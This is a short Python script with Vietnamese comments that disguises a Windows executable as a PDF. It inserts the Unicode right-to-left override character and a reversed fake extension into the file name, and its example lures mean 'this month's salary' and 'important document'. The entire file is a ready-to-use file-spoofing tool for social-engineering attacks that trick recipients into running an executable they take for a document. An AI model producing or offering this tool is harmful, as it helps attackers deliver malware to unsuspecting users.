
import os
import sys

def apply_rlo_rename(target_file, display_name, fake_ext):
    """
    target_file: File exe gốc (vd: troll.exe)
    display_name: Tên bạn muốn người dùng nhìn thấy (vd: Luong_thang_nay)
    fake_ext: Đuôi file muốn giả mạo (vd: pdf)
    """
    RLO = '\u202e'
    real_ext = ".exe"
    
    # Đảo ngược đuôi giả mạo
    reversed_fake_ext = fake_ext[::-1]
    
    # Tạo tên file mới
    # Cấu trúc: [Tên hiển thị] + [Dấu cách] + [RLO] + [Đuôi giả ngược] + [Đuôi thật]
    # Ví dụ: Luong_thang_nay ‮ fdp.exe -> Hiển thị thành: Luong_thang_nay exe.pdf
    new_name = f"{display_name}_{RLO}{reversed_fake_ext}{real_ext}"
    
    try:
        if os.path.exists(target_file):
            os.rename(target_file, new_name)
            print(f"--- THÀNH CÔNG ---")
            print(f"File gốc: {target_file}")
            print(f"Tên file mới (trong code): {new_name}")
            print(f"Hiển thị trên Windows: {display_name}_exe.{fake_ext}")
        else:
            print(f"Lỗi: Không tìm thấy file {target_file}")
    except Exception as e:
        print(f"Lỗi khi đổi tên: {e}")

if __name__ == "__main__":
    # Bạn có thể thay đổi 'Tài liệu mật' thành tên bất kỳ bạn muốn
    apply_rlo_rename("troll.exe", "Tai_lieu_quan_trong", "pdf")
